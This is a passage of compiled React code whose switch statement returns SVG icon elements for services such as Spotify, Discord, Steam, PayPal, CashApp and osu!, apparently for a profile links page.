11.73c-.006-.17-.139-.302-.304-.302-.166 0-.299.133-.304.302l-.189 6.821.189 3.131c.005.168.138.3.304.3.165 0 .298-.132.304-.302l.213-3.129L10.206 11.73zM11.148 11.577c-.181 0-.325.144-.33.328l-.174 6.647.174 3.101c.004.182.149.326.329.326.18 0 .324-.144.329-.328v.002l.196-3.102-.196-6.648C11.472 11.72 11.328 11.577 11.148 11.577zM12.403 11.793c-.195 0-.352.156-.355.353l-.158 6.404.158 3.082c.004.196.159.352.355.352.195 0 .351-.155.355-.353v.003l.178-3.082-.178-6.405C12.755 11.949 12.598 11.793 12.403 11.793zM13.88 10.617c-.061-.041-.133-.065-.21-.065-.075 0-.145.023-.205.062-.104.067-.173.185-.175.318l-.001.072-.143 7.547c0 .005.143 3.064.143 3.064 0 .005.001.008.001.013.005.085.037.164.089.226.07.084.175.138.292.138.103 0 .198-.042.266-.112.068-.068.113-.163.114-.268l.016-.303.144-2.757-.16-7.622C14.048 10.801 13.98 10.685 13.88 10.617z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M14.049 21.615L14.049 21.614 14.049 21.615 14.049 21.613 14.05 21.612 14.049 21.613 14.049 21.614zM15.136 9.894c-.061-.037-.131-.058-.206-.058-.097 0-.187.035-.256.093-.09.074-.148.187-.15.312l-.001.042-.166 8.271.084 1.529.083 1.488c.003.22.185.402.407.402.22 0 .403-.182.406-.405v.004l0 0 .181-3.017 0 0-.181-8.313C15.333 10.094 15.253 9.965 15.136 9.894zM26.31 14.619c-.505 0-.988.102-1.427.287-.293-3.325-3.083-5.934-6.484-5.934-.833 0-1.643.164-2.361.441-.278.108-.352.218-.355.434v11.711c.003.226.178.401.398.424.009.001 10.228 0 10.228 0 2.038 0 3.69-1.634 3.69-3.672C30 16.271 28.348 14.619 26.31 14.619z",
                  }),
                ],
              });
            case "Spotify":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#1DB954] duration-300 hover:scale-110 hover:text-[#1DB954]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm3.669 11.538a.498.498 0 0 1-.686.165c-1.879-1.147-4.243-1.407-7.028-.77a.499.499 0 0 1-.222-.973c3.048-.696 5.662-.397 7.77.892a.5.5 0 0 1 .166.686zm.979-2.178a.624.624 0 0 1-.858.205c-2.15-1.321-5.428-1.704-7.972-.932a.625.625 0 0 1-.362-1.194c2.905-.881 6.517-.454 8.986 1.063a.624.624 0 0 1 .206.858zm.084-2.268C10.154 5.56 5.9 5.419 3.438 6.166a.748.748 0 1 1-.434-1.432c2.825-.857 7.523-.692 10.492 1.07a.747.747 0 1 1-.764 1.288z",
                }),
              });
            case "Discord":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#7289DA] duration-300 hover:scale-110 hover:text-[#586fc2]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M13.545 2.907a13.227 13.227 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.19 12.19 0 0 0-3.658 0 8.258 8.258 0 0 0-.412-.833.051.051 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.041.041 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032c.001.014.01.028.021.037a13.276 13.276 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019c.308-.42.582-.863.818-1.329a.05.05 0 0 0-.01-.059.051.051 0 0 0-.018-.011 8.875 8.875 0 0 1-1.248-.595.05.05 0 0 1-.02-.066.051.051 0 0 1 .015-.019c.084-.063.168-.129.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.052.052 0 0 1 .053.007c.08.066.164.132.248.195a.051.051 0 0 1-.004.085 8.254 8.254 0 0 1-1.249.594.05.05 0 0 0-.03.03.052.052 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.235 13.235 0 0 0 4.001-2.02.049.049 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.034.034 0 0 0-.02-.019Zm-8.198 7.307c-.789 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612Zm5.316 0c-.788 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612Z",
                }),
              });
            case "Snapchat":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FFFC00] duration-300 hover:scale-110 hover:text-[#FFFC00]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M15.943 11.526c-.111-.303-.323-.465-.564-.599a1.416 1.416 0 0 0-.123-.064l-.219-.111c-.752-.399-1.339-.902-1.746-1.498a3.387 3.387 0 0 1-.3-.531c-.034-.1-.032-.156-.008-.207a.338.338 0 0 1 .097-.1c.129-.086.262-.173.352-.231.162-.104.289-.187.371-.245.309-.216.525-.446.66-.702a1.397 1.397 0 0 0 .069-1.16c-.205-.538-.713-.872-1.329-.872a1.829 1.829 0 0 0-.487.065c.006-.368-.002-.757-.035-1.139-.116-1.344-.587-2.048-1.077-2.61a4.294 4.294 0 0 0-1.095-.881C9.764.216 8.92 0 7.999 0c-.92 0-1.76.216-2.505.641-.412.232-.782.53-1.097.883-.49.562-.96 1.267-1.077 2.61-.033.382-.04.772-.036 1.138a1.83 1.83 0 0 0-.487-.065c-.615 0-1.124.335-1.328.873a1.398 1.398 0 0 0 .067 1.161c.136.256.352.486.66.701.082.058.21.14.371.246l.339.221a.38.38 0 0 1 .109.11c.026.053.027.11-.012.217a3.363 3.363 0 0 1-.295.52c-.398.583-.968 1.077-1.696 1.472-.385.204-.786.34-.955.8-.128.348-.044.743.28 1.075.119.125.257.23.409.31a4.43 4.43 0 0 0 1 .4.66.66 0 0 1 .202.09c.118.104.102.26.259.488.079.118.18.22.296.3.33.229.701.243 1.095.258.355.014.758.03 1.217.18.19.064.389.186.618.328.55.338 1.305.802 2.566.802 1.262 0 2.02-.466 2.576-.806.227-.14.424-.26.609-.321.46-.152.863-.168 1.218-.181.393-.015.764-.03 1.095-.258a1.14 1.14 0 0 0 .336-.368c.114-.192.11-.327.217-.42a.625.625 0 0 1 .19-.087 4.446 4.446 0 0 0 1.014-.404c.16-.087.306-.2.429-.336l.004-.005c.304-.325.38-.709.256-1.047Zm-1.121.602c-.684.378-1.139.337-1.493.565-.3.193-.122.61-.34.76-.269.186-1.061-.012-2.085.326-.845.279-1.384 1.082-2.903 1.082-1.519 0-2.045-.801-2.904-1.084-1.022-.338-1.816-.14-2.084-.325-.218-.15-.041-.568-.341-.761-.354-.228-.809-.187-1.492-.563-.436-.24-.189-.39-.044-.46 2.478-1.199 2.873-3.05 2.89-3.188.022-.166.045-.297-.138-.466-.177-.164-.962-.65-1.18-.802-.36-.252-.52-.503-.402-.812.082-.214.281-.295.49-.295a.93.93 0 0 1 .197.022c.396.086.78.285 1.002.338.027.007.054.01.082.011.118 0 .16-.06.152-.195-.026-.433-.087-1.277-.019-2.066.094-1.084.444-1.622.859-2.097.2-.229 1.137-1.22 2.93-1.22 1.792 0 2.732.987 2.931 1.215.416.475.766 1.013.859 2.098.068.788.009 1.632-.019 2.065-.01.142.034.195.152.195a.35.35 0 0 0 .082-.01c.222-.054.607-.253 1.002-.338a.912.912 0 0 1 .197-.023c.21 0 .409.082.49.295.117.309-.04.56-.401.812-.218.152-1.003.638-1.18.802-.184.169-.16.3-.139.466.018.14.413 1.991 2.89 3.189.147.073.394.222-.041.464Z",
                }),
              });
            case "Steam":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#2a475e] duration-300 hover:scale-110 hover:text-[#2a475e]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.198 2.198 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.217 2.217 0 0 1-1.312-1.568L.33 10.333Z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M4.868 12.683a1.715 1.715 0 0 0 1.318-3.165 1.705 1.705 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027Zm2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048Z",
                  }),
                ],
              });
            case "OGUsers":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[rgb(55,55,56)] duration-300 hover:scale-110 hover:text-[rgb(55,55,56)]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z",
                  }),
                  (0, c.jsx)("path", {
                    fillRule: "evenodd",
                    d: "M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z",
                  }),
                ],
              });
            case "Email":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffffff] duration-300 hover:scale-110 hover:text-[#ffffff]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Zm13 2.383-4.708 2.825L15 11.105V5.383Zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741ZM1 11.105l4.708-2.897L1 5.383v5.722Z",
                }),
              });
            case "Facebook":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#4267B2] duration-300 hover:scale-110 hover:text-[#4267B2]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z",
                }),
              });
            case "TikTok":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FE2C55] duration-300 hover:scale-110 hover:text-[#FE2C55]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M9 0h1.98c.144.715.54 1.617 1.235 2.512C12.895 3.389 13.797 4 15 4v2c-1.753 0-3.07-.814-4-1.829V11a5 5 0 1 1-5-5v2a3 3 0 1 0 3 3V0Z",
                }),
              });
            case "WhatsApp":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#25D366] duration-300 hover:scale-110 hover:text-[#25D366]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z",
                }),
              });
            case "WeHeartIt":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ff3e8e] duration-300 hover:scale-110 hover:text-[#ff3e8e]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M14 1a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1h-2.5a2 2 0 0 0-1.6.8L8 14.333 6.1 11.8a2 2 0 0 0-1.6-.8H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h12ZM2 0a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2.5a1 1 0 0 1 .8.4l1.9 2.533a1 1 0 0 0 1.6 0l1.9-2.533a1 1 0 0 1 .8-.4H14a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2Z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M8 3.993c1.664-1.711 5.825 1.283 0 5.132-5.825-3.85-1.664-6.843 0-5.132Z",
                  }),
                ],
              });
            case "Kik":
              return (0, c.jsxs)("svg", {
                fill: "#5DCD11",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#5DCD11] duration-300 hover:scale-110 hover:text-[#5DCD11]",
                viewBox: "0 0 30 30",
                width: "30px",
                height: "30px",
                children: [
                  (0, c.jsx)("path", {
                    fill: "none",
                    stroke: "#000000",
                    strokeLinecap: "round",
                    "stroke-linejoin": "round",
                    "stroke-miterlimit": "10",
                    "stroke-width": "5",
                    d: "M9.5 2.5L9.5 23.5M19.5 8.5L9.5 18.5M20.5 23.5L14.5 13.5",
                  }),
                  (0, c.jsx)("path", {
                    d: "M27 14.5A2.5 2.5 0 1 0 27 19.5A2.5 2.5 0 1 0 27 14.5Z",
                  }),
                ],
              });
            case "PayPal":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#00457C] duration-300 hover:scale-110 hover:text-[#00457C]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M14.06 3.713c.12-1.071-.093-1.832-.702-2.526C12.628.356 11.312 0 9.626 0H4.734a.7.7 0 0 0-.691.59L2.005 13.509a.42.42 0 0 0 .415.486h2.756l-.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.007a.351.351 0 0 1 .348-.297h.38c1.266 0 2.425-.256 3.345-.91.379-.27.712-.603.993-1.005a4.942 4.942 0 0 0 .88-2.195c.242-1.246.13-2.356-.57-3.154a2.687 2.687 0 0 0-.76-.59l-.094-.061ZM6.543 8.82a.695.695 0 0 1 .321-.079H8.3c2.82 0 5.027-1.144 5.672-4.456l.003-.016c.217.124.4.27.548.438.546.623.679 1.535.45 2.71-.272 1.397-.866 2.307-1.663 2.874-.802.57-1.842.815-3.043.815h-.38a.873.873 0 0 0-.863.734l-.03.164-.48 3.043-.024.13-.001.004a.352.352 0 0 1-.348.296H5.595a.106.106 0 0 1-.105-.123l.208-1.32.845-5.214Z",
                }),
              });
            case "CashApp":
              return (0, c.jsxs)("svg", {
                fill: "#00D632",
                width: "24px",
                height: "24px",
                className:
                  "h-7 w-7 text-[#00D632] duration-300 hover:scale-110 hover:text-[#00D632]",
                viewBox: "0 0 24 24",
                role: "img",
                xmlns: "http://www.w3.org/2000/svg",
                children: [
                  (0, c.jsx)("title", { children: "Cash App icon" }),
                  (0, c.jsx)("path", {
                    d: "M23.59 3.47A5.1 5.1 0 0 0 20.54.42C19.23 0 18.04 0 15.62 0H8.36c-2.4 0-3.61 0-4.9.4A5.1 5.1 0 0 0 .41 3.46C0 4.76 0 5.96 0 8.36v7.27c0 2.41 0 3.6.4 4.9a5.1 5.1 0 0 0 3.05 3.05c1.3.41 2.5.41 4.9.41h7.28c2.41 0 3.61 0 4.9-.4a5.1 5.1 0 0 0 3.06-3.06c.41-1.3.41-2.5.41-4.9V8.38c0-2.41 0-3.61-.41-4.91zM17.42 8.1l-.93.93a.5.5 0 0 1-.67.01 5 5 0 0 0-3.22-1.18c-.97 0-1.94.32-1.94 1.21 0 .9 1.04 1.2 2.24 1.65 2.1.7 3.84 1.58 3.84 3.64 0 2.24-1.74 3.78-4.58 3.95l-.26 1.2a.49.49 0 0 1-.48.39H9.63l-.09-.01a.5.5 0 0 1-.38-.59l.28-1.27a6.54 6.54 0 0 1-2.88-1.57v-.01a.48.48 0 0 1 0-.68l1-.97a.49.49 0 0 1 .67 0c.91.86 2.13 1.34 3.39 1.32 1.3 0 2.17-.55 2.17-1.42 0-.87-.88-1.1-2.54-1.72-1.76-.63-3.43-1.52-3.43-3.6 0-2.42 2.01-3.6 4.39-3.71l.25-1.23a.48.48 0 0 1 .48-.38h1.78l.1.01c.26.06.43.31.37.57l-.27 1.37c.9.3 1.75.77 2.48 1.39l.02.02c.19.2.19.5 0 .68z",
                  }),
                ],
              });
            case "Venmo":
              return (0, c.jsxs)("svg", {
                fill: "#008CFF",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#008CFF] duration-300 hover:scale-110 hover:text-[#008CFF]",
                viewBox: "0 0 50 50",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M41,4H9C6.243,4,4,6.243,4,9v32c0,2.757,2.243,5,5,5h32c2.757,0,5-2.243,5-5V9C46,6.243,43.757,4,41,4z M28,37H17l-3-22 l8-1.001L24,30c1.833-2.918,4-7.873,4-11c0-1.711-0.531-3.04-1-4l8-2c0.853,1.377,1,3.795,1,5.586C36,24.3,32.05,31.788,28,37z",
                  }),
                ],
              });
            case "Crypto":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffb515] duration-300 hover:scale-110 hover:text-[#ffb515]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M5.5 13v1.25c0 .138.112.25.25.25h1a.25.25 0 0 0 .25-.25V13h.5v1.25c0 .138.112.25.25.25h1a.25.25 0 0 0 .25-.25V13h.084c1.992 0 3.416-1.033 3.416-2.82 0-1.502-1.007-2.323-2.186-2.44v-.088c.97-.242 1.683-.974 1.683-2.19C11.997 3.93 10.847 3 9.092 3H9V1.75a.25.25 0 0 0-.25-.25h-1a.25.25 0 0 0-.25.25V3h-.573V1.75a.25.25 0 0 0-.25-.25H5.75a.25.25 0 0 0-.25.25V3l-1.998.011a.25.25 0 0 0-.25.25v.989c0 .137.11.25.248.25l.755-.005a.75.75 0 0 1 .745.75v5.505a.75.75 0 0 1-.75.75l-.748.011a.25.25 0 0 0-.25.25v1c0 .138.112.25.25.25L5.5 13zm1.427-8.513h1.719c.906 0 1.438.498 1.438 1.312 0 .871-.575 1.362-1.877 1.362h-1.28V4.487zm0 4.051h1.84c1.137 0 1.756.58 1.756 1.524 0 .953-.626 1.45-2.158 1.45H6.927V8.539z",
                }),
              });
            case "Battle Net":
              return (0, c.jsx)("svg", {
                fill: "#ace5ee",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#ace5ee] duration-300 hover:scale-110 hover:text-[#ace5ee]",
                viewBox: "0 0 30 30",
                width: "30px",
                height: "30px",
                children: (0, c.jsx)("path", {
                  d: "M24.822,13.457c0,0,2.139,0.109,2.139-1.149c0-1.643-2.849-3.124-2.849-3.124s0.446-0.946,0.724-1.475c0.279-0.529,1.064-2.591,1.133-3.063c0.088-0.592-0.047-0.778-0.047-0.778c-0.193,1.269-2.262,4.924-2.427,5.049c-2.018-0.945-4.79-1.208-4.79-1.208S15.993,2,13.442,2c-2.531,0-2.518,4.889-2.518,4.889S10.209,5.503,9.31,5.503c-1.312,0-1.743,1.983-1.743,4.133c-2.591,0-4.77,0.578-4.966,0.634c-0.194,0.057-0.807,0.503-0.529,0.446c0.566-0.181,3.229-0.593,5.56-0.391c0.128,2.044,1.322,4.705,1.322,4.705s-2.56,3.706-2.56,6.353c0,0.696,0.303,1.97,2.142,1.97c1.539,0,3.269-0.925,3.594-1.113c-0.284,0.406-0.495,1.177-0.495,1.532c0,0.291,0.172,1.113,1.359,1.113c1.525,0,3.229-1.168,3.229-1.168s1.608,2.671,2.984,3.895c0.37,0.329,0.726,0.39,0.726,0.39s-1.366-1.314-3.166-4.7c1.673-1.033,3.415-3.468,3.415-3.468s0.206,0.006,1.793,0.006c2.489,0,6.025-0.522,6.025-2.498C28.002,15.3,24.822,13.457,24.822,13.457z M25.101,12.23c0,0.721-0.687,0.712-0.687,0.712l-0.521,0.035c0,0-0.992-0.521-1.591-0.764c0,0,0.93-1.432,1.148-1.832C23.614,10.475,25.101,11.405,25.101,12.23z M14.687,4.876c1.17,0,2.839,2.758,2.839,2.758s-2.606-0.233-4.749,1.026C12.835,6.675,13.505,4.876,14.687,4.876z M10.052,7.112c0.371,0,0.735,0.451,0.885,0.834c0,0.253,0.131,1.731,0.131,1.731l-2.147-0.08C8.921,7.661,9.68,7.112,10.052,7.112z M9.829,20.55c-1.174,0-1.416-0.654-1.416-1.242c0-1.331,1.064-3.194,1.064-3.194s1.191,2.505,3.274,3.563C11.718,20.283,10.865,20.55,9.829,20.55z M13.641,23.173c-0.822,0-0.922-0.532-0.922-0.657c0-0.383,0.298-0.833,0.298-0.833s1.383-0.934,1.471-1.034l1.023,1.905C15.511,22.554,14.463,23.173,13.641,23.173z M16.208,22.134c-0.5-0.874-0.87-1.788-0.87-1.788s2.058,0.132,3.162-1.008c-0.688,0.31-1.787,0.7-3.066,0.582c2.672-2.351,4.231-4.055,5.549-5.815c-0.114-0.136-0.716-0.557-0.864-0.628c-0.796,0.957-3.889,4.262-6.754,5.898c-3.626-1.978-4.389-7.793-4.466-9.001l1.981,0.191c0,0-0.744,1.319-0.744,2.289s0.116,1.021,0.116,1.021s-0.025-1.691,1.021-2.999c0.796,4.237,1.627,6.407,2.274,7.701c0.329-0.136,0.945-0.409,0.945-0.409s-1.832-5.269-1.73-8.835c0.83-0.443,2.059-0.9,3.446-0.9c3.65,0,6.584,1.569,6.584,1.569l-1.149,1.602c0,0-1.023-1.851-2.468-2.182c0.761,0.567,1.614,1.317,2.059,2.397c-3.025-1.181-6.675-1.806-7.846-1.943c-0.102,0.432-0.088,1.049-0.088,1.049s4.895,0.903,8.457,2.939C21.734,18.318,16.879,21.738,16.208,22.134z M20.844,18.806c0,0,1.52-1.992,1.496-4.632c0,0,2.455,1.519,2.455,3.001C24.796,18.831,20.844,18.806,20.844,18.806z",
                }),
              });
            case "Valorant":
              return (0, c.jsxs)("svg", {
                fill: "#fa4454",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#fa4454] duration-300 hover:scale-110 hover:text-[#fa4454]",
                viewBox: "0 0 24 24",
                width: "24px",
                height: "24px",
                children: [
                  (0, c.jsx)("path", {
                    d: "M16.19,21H7.546L0,12.376V2.319L16.19,21z M8.454,19h3.356L2,7.681v3.943L8.454,19z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M21.535,16h-7.58L24,3.085v9.217L21.535,16z M18.044,14h2.42L22,11.697V8.915L18.044,14z",
                  }),
                ],
              });
            case "osu!":
              return (0, c.jsxs)("svg", {
                fill: "#fc5d99",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 50 50",
                width: "24px",
                height: "24px",
                children: [
                  (0, c.jsx)("path", {
                    d: "M25,5c11.028,0,20,8.972,20,20s-8.972,20-20,20S5,36.028,5,25S13.972,5,25,5 M25,3C12.85,3,3,12.85,3,25s9.85,22,22,22 s22-9.85,22-22S37.15,3,25,3L25,3z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M18,25.572c-0.01,0.796-0.124,1.615-0.494,2.374c-0.565,1.159-1.493,1.805-2.723,1.998 c-0.742,0.116-1.483,0.093-2.202-0.145c-1.178-0.389-1.916-1.236-2.307-2.427c-0.254-0.774-0.313-1.572-0.25-2.382 c0.061-0.793,0.249-1.549,0.659-2.23c0.589-0.981,1.457-1.527,2.553-1.69c0.75-0.112,1.499-0.087,2.221,0.171 c1.246,0.446,2,1.364,2.342,2.662C17.938,24.435,17.995,24.978,18,25.572z M15.688,25.465c-0.006-0.125-0.01-0.316-0.026-0.507 c-0.037-0.453-0.116-0.895-0.316-1.306c-0.201-0.414-0.519-0.678-0.961-0.757c-0.192-0.035-0.392-0.045-0.587-0.03 c-0.501,0.038-0.895,0.275-1.122,0.748c-0.104,0.217-0.187,0.451-0.242,0.687c-0.151,0.647-0.147,1.307-0.085,1.965 c0.037,0.398,0.123,0.785,0.299,1.146c0.166,0.34,0.409,0.593,0.764,0.711c0.396,0.133,0.796,0.13,1.191-0.01 c0.457-0.162,0.704-0.528,0.859-0.975C15.643,26.619,15.68,26.077,15.688,25.465z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M32.808,21.214c0.732-0.135,1.454-0.133,2.189,0c0,0.043,0,0.085,0,0.126c0,2.67-0.001,5.34,0.002,8.01 c0,0.095-0.027,0.13-0.109,0.157c-1.141,0.373-2.305,0.559-3.499,0.473c-0.515-0.037-1.03-0.087-1.52-0.279 c-0.927-0.363-1.451-1.105-1.712-2.09c-0.154-0.58-0.19-1.176-0.191-1.774c-0.003-1.505-0.001-3.011-0.001-4.516 c0-0.034,0.003-0.068,0.005-0.108c0.734-0.133,1.463-0.133,2.202,0.001c0,0.055,0,0.104,0,0.153 c0.001,1.559-0.004,3.118,0.009,4.677c0.003,0.314,0.052,0.634,0.122,0.94c0.141,0.618,0.53,0.963,1.118,1.045 c0.423,0.059,0.844,0.035,1.262-0.052c0.095-0.02,0.125-0.057,0.125-0.164c-0.003-2.149-0.003-4.298-0.003-6.447 C32.808,21.317,32.808,21.268,32.808,21.214z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M25.271,23.161c-0.364-0.107-0.711-0.229-1.067-0.31c-0.447-0.102-0.903-0.128-1.354-0.012 c-0.237,0.061-0.45,0.166-0.541,0.426c-0.121,0.345-0.004,0.693,0.322,0.836c0.356,0.156,0.731,0.266,1.097,0.397 c0.321,0.114,0.65,0.21,0.962,0.347c0.829,0.365,1.241,1.038,1.301,1.957c0.051,0.772-0.128,1.467-0.639,2.05 c-0.443,0.504-1.007,0.796-1.63,0.977c-0.68,0.197-1.375,0.201-2.072,0.151c-0.602-0.044-1.182-0.192-1.748-0.405 c-0.063-0.024-0.085-0.053-0.078-0.124c0.06-0.568,0.206-1.111,0.431-1.633c0.007-0.017,0.017-0.034,0.031-0.063 c0.042,0.015,0.082,0.029,0.122,0.045c0.646,0.253,1.31,0.411,2.006,0.377c0.32-0.015,0.633-0.066,0.92-0.228 c0.384-0.217,0.527-0.537,0.427-0.944c-0.039-0.156-0.113-0.292-0.253-0.361c-0.229-0.114-0.462-0.223-0.703-0.306 c-0.434-0.15-0.879-0.27-1.313-0.422c-0.321-0.112-0.608-0.296-0.869-0.522c-0.365-0.316-0.537-0.734-0.597-1.208 c-0.068-0.536-0.041-1.065,0.173-1.568c0.286-0.673,0.805-1.083,1.452-1.338c0.566-0.223,1.158-0.274,1.758-0.263 c0.766,0.014,1.505,0.172,2.227,0.428c0.048,0.017,0.096,0.025,0.087,0.105c-0.064,0.556-0.202,1.089-0.441,1.593 C25.277,23.152,25.27,23.161,25.271,23.161z",
                  }),
                  (0, c.jsx)("rect", {
                    width: "2",
                    height: "8",
                    x: "38",
                    y: "18",
                  }),
                  (0, c.jsx)("rect", {
                    width: "2",
                    height: "2",
                    x: "38",
                    y: "28",
                  }),
                ],
              });
            case "Last.fm":
              return (0, c.jsx)("svg", {
